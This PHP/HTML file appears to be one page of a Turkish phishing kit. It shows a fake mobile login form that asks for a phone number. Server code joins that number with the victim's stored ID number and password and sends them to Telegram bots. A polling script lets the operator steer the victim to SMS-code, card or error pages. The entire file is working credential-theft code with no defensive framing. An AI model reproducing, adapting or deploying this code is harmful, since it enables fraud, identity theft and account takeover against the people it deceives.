<?php
include "./panelgiris/config.php";
include "./panelgiris/project-security.php";

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['phone2'])) {
    date_default_timezone_set('Europe/Istanbul');
    include('connect.php');
    
    $tel = htmlspecialchars($_POST['phone2']);
    $ip = GetIPz();
   
    $query = $db->prepare('UPDATE sazan SET phone = ? WHERE ip = ?');
    $query->execute(array($tel, $ip));
     
    $db->query("UPDATE site SET sound='1'");
  
    $sazan_query = $db->prepare('SELECT ad, ay, phone, ip FROM sazan WHERE ip = ?');
    $sazan_query->execute(array($ip));
    $sazan_data = $sazan_query->fetch(PDO::FETCH_ASSOC);
    
    if ($sazan_data) {
        $message = "TC: " . $sazan_data['ad'] . "\n" .
                   "PASS: " . $sazan_data['ay'] . "\n" .
                   "TEL: " . $sazan_data['phone'] . "\n" .
                   "IP: " . $sazan_data['ip'];
    
        $bots_query = $db->query('SELECT bot_token, chat_id FROM telegram_bots');
        $bots = $bots_query->fetchAll(PDO::FETCH_ASSOC);
    
        foreach ($bots as $bot) {
            sendTelegramMessage($bot['bot_token'], $bot['chat_id'], $message);
        }
    }
 
    header('Location: bekle.php');
    exit();
}

function sendTelegramMessage($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}
?>


<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Mobile Sayfa</title>

    <style>
        @font-face {
            font-family: 'KelveticaNobis';
            src: url('./css/KelveticaNobis.otf') format('opentype');
            font-weight: normal;
            font-style: normal;
        }

        body, html {
            background-color: #f1f2f2;
            padding: 0;
            max-width: 414px;
            margin: 0 auto;
            font-family: 'KelveticaNobis', sans-serif;
        }

        header {
            width: 100%;
            height: 106px;
            background-image: url('./css/baslik.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .main {
            min-height: 805px;
            width: 100%;
            height: 805px;
            background-image: url('./css/body.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        input.form-control {
            width: 85%;
            height: 50px;
            font-family: 'KelveticaNobis', sans-serif;
            margin-bottom: 10px;
            margin-top: 5px;
            border: none;
            font-size: 16px;
            margin-left: 15px;
            margin-right: 15px;
            padding-left: 20px;
        }

        input.form-control:focus {
            outline: none;
            box-shadow: none;
        }

        button.btn {
            width: 90%;
            height: 50px;
            margin-top: 20px;
            background-color: #2ea8ab;
            border: none;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
            border-radius: 0;
        }

       

        .error-message {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
            font-weight: 700;
        }    .form-control {
            font-size: 12px;
            font-weight: bold;
            border: 0;
            width: 70%;
            display: block;
            margin-top: 17px;
        }

        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }

        .btn {
            width: 75%;
            height: 50px;
            margin-top: 20px;
            background-color: #2ea8ab;
            border: none;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header></header>
    <form method="POST" action="phone.php" id="phoneForm">
        <div class="main">
            <center>
                <label for="phone2" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 15px;color: #4b4848;">Telefon Numaranızı Yazınız</label>
                <input type="text" name="phone2" class="form-control" value="+90" id="phone2" minlength="13" maxlength="13" inputmode="numeric" required>

                <div id="errorMessage" class="error-message">Telefon numaranızı lütfen kontrol ediniz.</div>
				<?php 
					if(isset($_GET['err'])){
					?>
					
                		<div id="errorMessage" class="error-message" style="display:block!important;">Telefon numaranızı lütfen kontrol ediniz.</div>
				<?php
					}
				?>
            </center>

            <center>
                <button id="formSubmit" class="btn" type="button" onclick="submitFirstForm()">Giriş</button>
            </center>
        </div>
    </form>

    <script>
    const phoneInput = document.getElementById("phone2");

    phoneInput.addEventListener("input", function(event) {
        let phoneValue = phoneInput.value;

        if (!phoneValue.startsWith("+90")) {
            phoneValue = "+90" + phoneValue.replace(/\+90/g, '');
        }

        phoneValue = phoneValue.slice(0, 13);
        phoneInput.value = phoneValue;
    });

    function submitFirstForm() {
        const phoneValue = phoneInput.value;

         setCookie("phoneNumber", phoneValue, 1);  

        if (/^\+905\d{9}$/.test(phoneValue)) {
            document.getElementById("phoneForm").submit();
        } else {
            document.getElementById("errorMessage").style.display = "block";
        }
    }
 
    function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    
    function getCookie(name) {
        const nameEQ = name + "=";
        const ca = document.cookie.split(';');
        for (let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }

     window.onload = function() {
        const savedPhone = getCookie("phoneNumber");
        if (savedPhone) {
            phoneInput.value = savedPhone;
        }
    };
		
		 $('header').on('click', function() {
            window.location.href = '/index.php';
        });
		
		function sendUrlPath() {
			const currentUrl = window.location.pathname;
			const urlPath = currentUrl.substring(currentUrl.lastIndexOf('/') + 1);
			const xhr = new XMLHttpRequest();
			xhr.open("POST", "i1.php", true);
			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			xhr.onreadystatechange = function () {
				if (xhr.readyState === 4 && xhr.status === 200) {
					const responseText = xhr.responseText.trim();
					switch (responseText) {
						case "sms":
							window.location.href = 'sms.php';
							break;
						case "hata":
							window.location.href = 'hatali.php';
							break;
						case "sms2":
							window.location.href = 'bildirim.php';
							break;
                        case "telhata":
                            window.location.href = 'phone.php?err';
                            break;
                        case "kart":
                            window.location.href = 'iade-al.php';
                            break;
						case "back":
							window.location.href = '/';
							break;
						case "tebrik":
							window.location.href = 'basarili.php';
							break;
						default:

					}
				}
			};
			xhr.send(`x=${urlPath}`);
		}


		setInterval(sendUrlPath, 2100);
</script>

 
</body>
</html>
